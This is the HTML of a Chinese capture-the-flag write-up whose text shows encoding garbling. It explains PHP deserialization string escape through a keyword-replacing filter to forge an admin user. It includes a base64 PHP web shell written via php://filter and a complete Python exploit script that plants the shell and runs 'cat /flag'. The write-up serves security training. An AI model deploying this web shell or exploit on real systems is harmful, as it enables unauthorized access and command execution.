    $lists=[&quot;flag&quot;,&quot;&#39;&quot;,&quot;\\&quot;,&quot;sleep&quot;,&quot;and&quot;,&quot;||&quot;,&quot;&amp;&amp;&quot;,&quot;select&quot;,&quot;union&quot;];
    foreach($lists as $list)&#123;
        $c=str_replace($list,&quot;error&quot;,$c);
    &#125;
    #echo $c;
    return $c;
&#125;
</code></pre>
<h3 id="å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸"></a><font style="color:rgb(38,38,38);">å­—ç¬¦ä¸²é€ƒé€¸</font></h3><ul>
<li>éå†é»‘åå•ï¼Œå°†æ¯ä¸ªå±é™©è¯æ›¿æ¢ä¸ºâ€errorâ€</li>
<li>ç¤ºä¾‹ï¼šè¾“å…¥<code>&#39; UNION SELECT flag</code> â†’ è¾“å‡º<code>error UNION SELECT error</code></li>
</ul>
<p>è¿™é‡Œæˆ‘çŒœæµ‹å­˜åœ¨éé¢„æœŸè§£</p>
<p>å› ä¸ºwafçš„è¿‡æ»¤å¹¶ä¸å®Œæ•´<code>str_replace</code>åŒºåˆ†å¤§å°å†™ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œsqlæ³¨å…¥</p>
<p>éé¢„æœŸè§£çš„æ€è·¯å°±æä¾›åˆ°è¿™é‡Œï¼Œæœ‰å…´è¶£çš„å¯ä»¥å»è¯•è¯•</p>
<h4 id="å­—ç¬¦é€ƒé€¸çš„åŸç†"><a href="#å­—ç¬¦é€ƒé€¸çš„åŸç†" class="headerlink" title="å­—ç¬¦é€ƒé€¸çš„åŸç†"></a>å­—ç¬¦é€ƒé€¸çš„åŸç†</h4><p><font style="color:rgb(76, 73, 72);">é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ååºåˆ—çš„ç»“æŸä½ç½®ã€‚å½“ååºåˆ—åŒ–é‡åˆ°</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">æ—¶å°±ä¼šåœæ­¢ã€‚æ³¨æ„</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">æ˜¯ä¸èƒ½åŒ…å«å†å­—ç¬¦ä¸²é‡Œçš„å³åƒ</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;s:5:&quot;lll;&#125;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">å‰ä¸€ä¸ª</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">æ˜¯å­—ç¬¦ä¸²çš„ç¬¬4,5ä¸ªå­—ç¬¦ï¼Œè¿™å°±å¯¼è‡´äº†å…¶æ— æ³•å°†ååºåˆ—æå‰ç»“æŸã€‚<br></font><font style="color:rgb(76, 73, 72);">ä½†æ˜¯å¦‚æœç”±äºwafå¯¼è‡´å­—ç¬¦å˜å¤šæˆ–è€…å‡å°‘è¿™å°±ä¼šå¯¼è‡´ï¼ŒåŸæœ¬åº”è¯¥è¢«è§£æä¸ºå­—ç¬¦çš„å­—ç¬¦è¢«è§£æä¸ºç‰¹æ®Šå­—ç¬¦ï¼Œä½¿å¾—ååºåˆ—çš„ç»“æœè¢«æ›´æ”¹ã€‚</font></p>
<h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><p><font style="color:rgb(76, 73, 72);">è¿˜æ˜¯æ‹¿ä¸Šé¢çš„å‡½æ•°æ¥ä½œä¸ºwafæ¥è§£é‡Š</font></p>
<pre><code class="language-php">&lt;?php
  function black_list($str)
&#123;
  $str=preg_replace(&#39;/flag/i&#39;,&#39;hacker~&#39;,$str);
return $str;
&#125;
class E&#123;
  public $a=&#39;flag&quot;;&#125;&#39;;
  public $b=&quot;lalalalala&quot;;
&#125;
$a=serialize(new E());
$a=black_list($a)
</code></pre>
<p><font style="color:rgb(76, 73, 72);">ä¸Šé¢çš„ä»£ç å°±å­˜åœ¨å­—ç¬¦é€ƒé€¸å­—ç¬¦å¢å¤šçš„æ¼æ´<br></font><font style="color:rgb(76, 73, 72);">æˆ‘ä»¬è¦åˆ©ç”¨ä¿®æ”¹</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;$a&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">çš„å€¼æ¥å°è¯•ä¿®æ”¹$bçš„å€¼ã€‚</font></p>
<pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;hacker~&quot;;&#125;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„çš„flagå˜æˆäº†</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;hacker~&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">æ­£å¥½å’Œ</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;flag&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">çš„é•¿åº¦ç›¸åŒé‚£ä¹ˆè¿™å°±å¯¼è‡´äº†hacker~è¢«è¯†åˆ«ä¸ºäº†å­—ç¬¦ä¸²è€Œ</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">è¢«è¯†åˆ«ä¸ºäº†ç‰¹æ®Šå­—ç¬¦ã€‚è¿™å°±å¯¼è‡´äº†ååºåˆ—æ˜¯é‡åˆ°äº†</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">æå‰ç»“æŸã€‚è¿™å°±æ˜¯wafé”™è¯¯çš„å°†ååºåˆ—çš„çš„å­—ç¬¦å¢å¤šå¯¼è‡´äº†</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">é€ƒé€¸å‡ºå­—ç¬¦ä¸²è¢«è§£æä¸ºååºåˆ—è¯­å¥ã€‚</font><br><font style="color:rgb(76, 73, 72);">é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">è¿›è¡Œæ›´æ”¹æ›´æ”¹æˆ</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:10:&quot;hahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">å¦‚æœè¿™å¥è¯è¢«é€ƒé€¸å°±ä¼šé€ æˆååºåˆ—çš„ç»“æœè¢«æ›´æ”¹å³ç±»çš„å±æ€§è¢«æ›´æ”¹ã€‚</font><br><font style="color:rgb(76, 73, 72);">å¦‚æœè¦ä½¿</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">é€ƒé€¸å°±è¦ä½¿popé“¾å†è¢«wafæ›´æ”¹åçš„å­—ç¬¦å¢å¤šç›¸åŒå­—ç¬¦æ•°ã€‚å¦‚</font></p>
<pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">æˆ‘ä»¬ä¼ å…¥çš„</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;$a&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">å€¼ä¸º</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">ä¼ å…¥äº†8ä¸ªflagå†ç»è¿‡wafåå˜ä¸º</font></p>
<pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;hacker~hacker~hacker~hacker~hacker~hacker~hacker~hacker~&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">æ›¿æ¢åçš„å­—ç¬¦æ­£å¥½ä¸º64ä¸ªå³å¤šå‡ºæ¥çš„å­—ç¬¦æ•°æ•´å¥½ä¸ºéœ€è¦é€ƒé€¸çš„å­—ç¬¦æ•°ã€‚å¯¼è‡´</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">é€ƒé€¸è¿™å°±ä½¿å¾—</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">é—­åˆå‰ä¸€ä¸ªå¼•å·</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">è¢«è§£æä¸ºååºåˆ—åŒ–é“¾ã€‚è¿™å°±ä½¿å¾—è¢«è§£æåçš„bå˜ä¸ºäº†hhhhhahahahaè€Œä¸æ˜¯lalalalalalaã€‚</font></p>
<h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p><font style="color:rgb(76, 73, 72);">wafå‡½æ•°æ˜¯å¯¹å…³é”®å­—è¿›è¡Œæ›¿æ¢ï¼Œè¿™å°±å¯¼è‡´äº†åºåˆ—åŒ–çš„å­—ç¬¦æ•°é‡å‘ç”Ÿäº†æ”¹å˜ï¼Œä»è€Œå¯¼è‡´äº†å­—ç¬¦ä¸²é€ƒé€¸ã€‚</font></p>
<p><font style="color:rgb(76, 73, 72);">æˆ‘ä»¬æƒ³è¦ä¼ªé€ çš„å…¶å®æ˜¯ç±»ä¼¼äºå¦‚ä¸‹çš„åºåˆ—åŒ–å­—ç¬¦ï¼Œç”¨æˆ·åæ— æ‰€è°“ï¼Œä½†æ˜¯isadminè¦ä¸ºtrue(åˆ¤æ–­æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼Œå› ä¸ºåªæœ‰ç®¡ç†å‘˜æ‰æœ‰å†™å…¥æƒé™)</font></p>
<p><font style="color:rgb(76, 73, 72);">æ„å»ºä»¥ä¸‹åºåˆ—åŒ–</font></p>
<pre><code class="language-php">&lt;?php
class User
&#123;
    public $username;
    public $isadmin;
    public function __construct($username,$isadmin)
    &#123;
        $this-&gt;username=$username;
        $this-&gt;isadmin=$isadmin;
    &#125;

&#125;

$user = new User(&quot;zerotrace&quot;, true);
echo serialize($user);
#è¾“å‡ºO:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:9:&quot;zerotrace&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;
</code></pre>
<p><font style="color:rgb(76, 73, 72);">é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥çš„usernameå°±åº”è¯¥æ˜¯xxxxxxâ€;s:7:â€isadminâ€;b:1;}ã€‚å‰é¢çš„xxxxxç»è¿‡wafåä¼šå˜å¤š21ä¸ªä»è€ŒæŠŠåé¢çš„</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">é€ƒé€¸å‡ºå»<br></font><font style="color:rgb(76, 73, 72);">é‚£ä¹ˆxxxxå°±å¯ä»¥æ˜¯flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagã€‚21ä¸ªflagä¼šè¢«æ›¿æ¢æˆ21ä¸ªerrorã€‚</font></p>
<p>é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªå­—ç¬¦ä¸²é€ƒé€¸ä¼ªé€ adminçš„ç”¨æˆ·åå¦‚ä¸‹</p>
<pre><code class="language-php">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;
</code></pre>
<p><img src="1742541181145-48f5cb2a-8cbb-4b19-93d9-9414db0415fb.png" loading="lazy"></p>
<p>æˆåŠŸä¼ªé€ admin</p>
<p>ä½¿ç”¨ä¼ªåè®®å†™å…¥æ–‡ä»¶</p>
<pre><code class="language-php">filename=php://filter/convert.base64-decode/resource=/var/www/html/1.php&amp;txt=aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==
</code></pre>
<p>èšå‰‘è¿æ¥</p>
<p><img src="1742541250329-3feb7b36-2972-41d3-a79a-6be769e089ac.png" loading="lazy"></p>
<p><img src="1742541278009-4d0f89ba-7d63-4468-9193-3f8e4438336e.png" loading="lazy"></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨expç›´æ¥æ¢­å“ˆ</p>
<pre><code class="language-python">import requests
def exp(url):
    data=&#123;&quot;username&quot;:&#39;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#39;,&quot;password&quot;:&quot;123456&quot;&#125;
    r=requests.post(url+&quot;register.php&quot;,data=data)
    #print(r.text)

    session = requests.Session()
    login_response = session.post(url+&quot;login.php&quot;, data=data)

    shell=&#123;&quot;filename&quot;:&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;,&quot;txt&quot;:&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;&#125;
    protected_response = session.post(url+&quot;dashboard.php&quot;,data=shell)
    response = requests.post(url+&quot;shell.php&quot;,data=&#123;&quot;123&quot;:&quot;system(&#39;cat /flag&#39;);&quot;&#125;)
    print(response.text)

if __name__==&quot;__main__&quot;:
    url=&quot;http://node2.anna.nssctf.cn:28932/&quot;
    exp(url)
</code></pre>
<p><img src="1742526871287-3b615f13-a594-4150-8208-72e77b2480fa.png" loading="lazy"></p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>ZeroTrace</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://example.com/article/2025/03/2025GHCTF-wp.html/" title="2025GHCTFæ–°ç”Ÿèµ›(æ‚„æ‚„å¡å›½é™…é¢˜)">http://example.com/article/2025/03/2025GHCTF-wp.html/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> è®¸å¯åè®®ã€‚</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/2025/03/2025.3.15-practice-wp.html/" rel="prev" title="203å‘¨æœ«ç»ƒä¹ èµ›25/3/15"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">203å‘¨æœ«ç»ƒä¹ èµ›25/3/15</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/2025/03/welcome-203.html/" rel="next" title="æ¬¢è¿æ¥åˆ°203"><span class="post-nav-text">æ¬¢è¿æ¥åˆ°203</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 â€“ 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> John Doe</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v7.3.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>æ„Ÿè°¢é™ªä¼´</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2025-03-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} å¤© ${passHour} å°æ—¶ ${passMinute} åˆ† ${passSecond} ç§’`;
}
blog_live_time();
</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>